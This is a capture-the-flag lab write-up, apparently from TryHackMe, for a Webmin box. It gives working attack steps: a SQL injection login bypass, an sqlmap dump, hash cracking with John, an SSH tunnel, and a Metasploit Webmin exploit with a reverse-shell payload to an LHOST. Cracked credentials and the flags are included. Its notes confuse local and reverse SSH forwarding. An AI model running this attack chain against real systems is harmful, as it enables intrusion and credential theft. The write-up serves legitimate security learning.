## Target: 10.64.134.151
### Recon
- Nmap: ``nmap 10.64.134.151 -A -p- -oA nmap``
### Enumeration
- Open Ports:
	- **22**/tcp, **ssh**
	- **80**/tcp, **http**, Apache httpd 2.4.18 ((Ubuntu))
- Web Findings: 
	- We are taken to a gaming site with Agent 47 pictured on the home page.
	- There is a login page which we will try to attack with SQLi
### Vulnerabilities
- Login fields are vulnerable to SQLi
### Exploitation
- We use ``' OR 1=1 -- `` to bypass the login form.
- This presents us with a page with a search field which we will also attack, this time with SQLmap.
- We intercept a request to the search tool with Burp Suite
![[Screenshot 2026-01-03 at 1.41.51 PM.png]]
- Now we craft an SQLmap command to dump the database.
	- ``sqlmap -r request.txt --dbms=mysql --dump``
![[Screenshot 2026-01-03 at 1.45.58 PM.png]]
- We discover a usernamee and password hash: _agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14_
- We can now crack this hash with john.
	- We save the hash to a file ``hash.txt``
	- ``john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256``
	- Password is _videogamer124_
- Now we can try to ssh into the machine with the newfound password and _agent47_ as the username. It works!
- We find the user.txt file:
	- _649ac17b1480ac13ef1e4fa579dac95c_
![[Screenshot 2026-01-03 at 1.55.07 PM.png]]
- We learn a bit now about _Reverse SSH port forwarding_, which is described in the notes section below.
![[cYZsC8p.png]]
- We run ``ss -tulpn`` it will tell us what socket connections are running

|   |   |
|---|---|
|**Argument**|**Description**|
|-t|Display TCP sockets|
|-u|Display UDP sockets|
|-l|Displays only listening sockets|
|-p|Shows the process using the socket|
|-n|Doesn't resolve service names|
- We see that there is a service running on port 10000. This is blocked by a firewall (we can apparently see this by looking at iptables, but this is not explained clearly in the lesson).
- We run ``ssh -L 10000:localhost:10000 [username]@[Target_IP]``
	- "**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ``ssh -L 9000:imgur.com:80 user@example.com.`` Going to localhost:9000 on your machine, will load imgur traffic using your other server." - THM
- Browsing to ``localhost:10000`` takes us to a Webmin CMS login page
	- We try our harvested credentials and, sure enough, we are now logged into the Webmin 1.580 dashboard.
### Privilege Escalation
- We will use metasploit in this case to re-exploit & elevate our privileges.
- We use the ``unix/webapp/webmin_show_cgi_exec`` exploit.
	- ``payload => cmd/unix/reverse``
	- ``RHOSTS => 127.0.0.1`` (because we are using Reverse SSH port forwarding)
	- ``RPORT => 10000``
	- ``LHOST => 10.64.100.181``
	- ``SSH => false``
- Boom! We are root.
	- root.txt _a4b945830144bdd71908d12d902adeee_
### Flags
- User: _649ac17b1480ac13ef1e4fa579dac95c_
- Root: _a4b945830144bdd71908d12d902adeee_
### Notes
- I am unclear on how we knew that the database type was mysql.
- Like the database type, I am unsure as to how we would have known the hash type if we were not told.
- ##### Reverse SSH port forwarding
	- "Reverse SSH port forwarding (also known as remote port forwarding or reverse tunneling) is a technique that redirects traffic from a specified port on a publicly accessible **remote server** back to a designated port on a **local machine** that is behind a restrictive firewall or Network Address Translation (NAT) and may not have a public IP address. The process essentially reverses the typical direction of network access. The connection is initiated from the local machine (client) to the remote server, and this initial outbound connection is then used as a secure, encrypted tunnel to allow inbound access to services on the local machine from the remote server."